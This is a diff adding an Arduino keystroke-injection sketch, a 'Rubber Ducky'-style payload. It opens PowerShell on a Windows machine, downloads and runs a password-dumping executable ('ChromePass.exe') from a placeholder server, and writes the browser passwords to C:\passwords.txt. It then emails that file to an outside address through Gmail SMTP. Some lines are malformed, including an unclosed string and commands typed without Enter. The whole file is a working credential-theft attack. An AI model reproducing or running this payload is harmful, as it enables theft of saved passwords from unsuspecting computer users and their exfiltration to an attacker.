@@ -1,0 +1,127 @@
+
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("powershell");
+
+  typeKey(KEY_RETURN);
+
+  delay(600);
+
+  Keyboard.print("$url = \"https://seuservidor?Chrome.exe/")
+
+  Keyboard.print("$output = \"ChromePass.exe\"");
+
+  Keyboard.print("$wc = New-Object System.Net.WebClient");
+
+  Keyboard.print("$wc.DownloadFile($url, $output)");
+
+  delay(1000);
+
+  Keyboard.print("start-process ChromePass.exe");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  delay(1000);
+
+  delay(9000);
+
+  Keyboard.print("C:\\passwords.txt");
+
+  delay(5000);
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("powershell");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.EnableSsl = $true");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('seuemail', 'suasenha');");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.From = 'seuemail'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.To.Add('seuemail')");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.Subject = 'Ducky chrome passwords'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.Body = 'Attached is your list of passwords.'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.Attachments.Add('c:\\passwords.txt')");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
+
+  typeKey(KEY_RETURN);
+
+  delay(3000);
+
+  Keyboard.print("exit");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
